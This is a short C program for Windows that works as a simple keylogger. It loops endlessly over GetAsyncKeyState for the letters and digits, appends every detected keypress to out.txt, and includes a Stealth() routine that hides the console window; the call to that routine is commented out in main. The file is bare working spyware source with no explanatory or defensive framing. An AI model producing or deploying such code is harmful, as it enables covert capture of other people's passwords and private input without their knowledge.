#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
void Stealth(){
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth,0);
}
void save(char i){
	FILE *out;
	out=fopen("out.txt","a");
	if(out!=NULL){
		fprintf(out,"%c ",i);
		fclose(out);
	}		
}
int main(void){
	//Stealth();
	char i;	
	while(1){		
		for(i='A';i<='Z';i++)if(GetAsyncKeyState(i)==-32767) save(i);
		for(i='0';i<='9';i++)if(GetAsyncKeyState(i)==-32767) save(i);	
	}
    system("pause");
    return 0;
}
